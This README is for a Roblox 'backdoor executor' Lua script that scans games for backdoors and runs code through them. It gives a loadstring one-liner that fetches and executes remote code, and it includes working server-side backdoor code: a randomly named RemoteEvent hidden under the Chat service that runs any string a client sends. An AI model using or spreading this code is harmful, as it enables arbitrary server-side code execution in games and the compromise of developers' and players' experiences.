# backdoor-executor.lua
(pls help me get a new name for this script)
might be better than [backdoor.exe](https://github.com/iK4oS/backdoor.exe).

## Info
This script is for [Roblox](https://roblox.com) scanning backdoors and executing them within a gui.
### Requirements
- A non skiddy brain
- Decent executor that supports filesystem functions (for config)
### Script
Just use the script below and execute it.
```lua
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/backdoor-executor.lua"))()
```

## Adding a backdoor in your game
Get access to a game in Roblox Studio, create a script and paste the few lines of code below in the script.
Make sure to enable `Loadstring` in `ServerScriptService`. (credits to [backdoor.exe](https://github.com/iK4oS/backdoor.exe) for copying this thingy.)
```lua
local Remote = Instance.new("RemoteEvent")
Remote.Name = tostring(math.random(100000000,1000000000))
Remote.Parent = game:GetService("Chat"):WaitForChild("ClientChatModules").MessageCreatorModules
Remote.OnServerEvent:Connect(function(player, execute)
	loadstring(execute)()
end)
```
